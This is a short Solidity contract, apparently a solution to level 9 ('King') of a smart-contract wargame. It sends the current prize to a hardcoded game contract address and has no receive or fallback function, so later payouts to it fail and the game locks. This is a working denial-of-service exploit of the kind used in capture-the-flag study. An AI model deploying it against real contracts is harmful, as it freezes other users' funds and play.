// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel09.sol";

contract KingMaker {
    King level09 = King(payable(0x3d8A1317A91B2b9f53A108E00dA27aa2DacD7d90));

    constructor() payable {
        require(msg.value >= level09.prize(), "Not enough Ether to become king");
        becomeKing();
    }

    function becomeKing() private {
        uint256 prize = level09.prize();

        (bool success,) = address(level09).call{value: prize}("");
        require(success, "Failed to become king");
    }
}
